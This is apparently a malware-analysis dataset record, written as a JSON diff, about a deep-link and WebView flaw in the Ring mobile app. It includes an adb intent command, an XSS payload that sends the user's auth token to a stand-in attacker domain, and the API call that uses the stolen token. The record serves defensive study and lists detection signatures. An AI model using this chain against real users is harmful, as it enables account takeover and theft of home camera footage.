@@ -1,0 +1,130 @@
+{
+  "package_info": {
+    "package_name": "Ring",
+    "package_manager": "Android (APK/Google Play)",
+    "package_versions": "≤ 3.50.0 (Android), ≤ 5.50.0 (iOS)",
+    "why_malicious": "The package contained an implicitly exported activity that allowed untrusted apps to load arbitrary web content into a privileged WebView, enabling token theft and exfiltration of sensitive user data and recordings via a chained XSS and API abuse attack."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when a crafted Intent is sent to the vulnerable activity)",
+        "file_location": "AndroidManifest.xml (com.ringapp/com.ring.nh.deeplink.DeepLinkActivity)",
+        "required_permissions": [
+          "network",
+          "inter-app communication"
+        ]
+      },
+      "code_snippet": "adb shell am start -n 'com.ringapp/com.ring.nh.deeplink.DeepLinkActivity' -d 'https://MALICIOUS.DOMAIN.COM/better-neighborhoods/'",
+      "code_language": "shell/Android Intent",
+      "code_behavior": "At runtime, the code triggers the DeepLinkActivity with a crafted Intent, causing the app to load attacker-controlled web content into a privileged WebView.",
+      "malice_analysis": {
+        "why_suspicious": "Allows any app to trigger loading of arbitrary web content in a privileged context, which is a classic vector for privilege escalation and data theft.",
+        "violated_expectations": "Normal behavior would restrict such activity to trusted sources or require explicit user action; here, any app can trigger it silently.",
+        "similar_legitimate_use": "Deep linking is legitimate for navigation, but should be restricted to trusted URIs and not implicitly exported.",
+        "key_indicators": [
+          "Implicitly exported activity",
+          "No URI validation beyond substring match",
+          "Loads arbitrary external web content"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (when attacker-controlled web page is loaded in WebView)",
+        "file_location": "WebView JavaScript context (via DeepLinkActivity)",
+        "required_permissions": [
+          "WebView JavaScript interface",
+          "network"
+        ]
+      },
+      "code_snippet": "<script>window.location='https://MALICIOUS.DOMAIN.COM/poc?token='+__NATIVE_BRIDGE__.getToken()</script>",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the injected JavaScript accesses the privileged __NATIVE_BRIDGE__.getToken() interface to steal the user's authorization token and exfiltrates it to an attacker-controlled server.",
+      "malice_analysis": {
+        "why_suspicious": "Accessing privileged JavaScript interfaces from attacker-controlled content is a critical security risk, enabling token theft.",
+        "violated_expectations": "WebView JavaScript interfaces should not be exposed to untrusted content; here, attacker content can directly access sensitive APIs.",
+        "similar_legitimate_use": "Legitimate use would restrict such interfaces to trusted, first-party content only.",
+        "key_indicators": [
+          "Reflected XSS in trusted subdomain",
+          "Access to privileged JavaScript interface",
+          "Exfiltration of sensitive tokens"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (after token exfiltration, via attacker backend)",
+        "file_location": "API calls to https://ring.com/mobile/authorize and other Ring APIs",
+        "required_permissions": [
+          "network",
+          "access to exfiltrated token and hardware ID"
+        ]
+      },
+      "code_snippet": "POST https://ring.com/mobile/authorize { token, hardware_id }",
+      "code_language": "http/api",
+      "code_behavior": "After exfiltration, the attacker uses the stolen token and hardware ID to obtain an rs_session cookie, which is then used to access Ring APIs and extract personal data, device geolocation, and camera recordings.",
+      "malice_analysis": {
+        "why_suspicious": "Use of stolen credentials to access sensitive APIs is a hallmark of account takeover and data exfiltration attacks.",
+        "violated_expectations": "APIs should not be accessible with tokens obtained via untrusted channels; here, the attacker can fully impersonate the user.",
+        "similar_legitimate_use": "Legitimate use would be by the app itself, not by an attacker with stolen credentials.",
+        "key_indicators": [
+          "API access with exfiltrated credentials",
+          "Extraction of personal and device data"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious app triggers DeepLinkActivity with attacker-controlled URL.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Loads attacker web content in privileged WebView."
+    },
+    {
+      "step": 2,
+      "action": "Attacker web page executes JavaScript to access privileged interface and steal token.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Token is exfiltrated to attacker server."
+    },
+    {
+      "step": 3,
+      "action": "Attacker uses stolen token and hardware ID to obtain session cookie and access Ring APIs.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Extraction of personal data, geolocation, and camera recordings."
+    },
+    {
+      "step": 4,
+      "action": "(Optional) Attacker automates video analysis using computer vision services.",
+      "implemented_by": [],
+      "leads_to": "Automated extraction of sensitive information from video feeds."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Implicitly exported Android activities accepting arbitrary external Intents",
+      "WebView loading of non-whitelisted external URLs",
+      "JavaScript interface exposure to untrusted web content",
+      "Exfiltration of tokens or credentials via network requests"
+    ],
+    "file_indicators": [
+      "AndroidManifest.xml with exported=true for DeepLinkActivity",
+      "WebView components with addJavascriptInterface calls"
+    ],
+    "network_indicators": [
+      "Outbound requests to non-Ring domains from WebView context",
+      "POST requests to /mobile/authorize with tokens not generated by the app"
+    ],
+    "how_to_detect": "Monitor for apps with exported activities that accept arbitrary URLs, especially those loading external content into WebViews. Flag any WebView JavaScript interface exposure to untrusted domains. Detect network requests exfiltrating tokens or session data to non-official domains. Review API usage patterns for access with tokens not generated by the official app."
+  }
+}
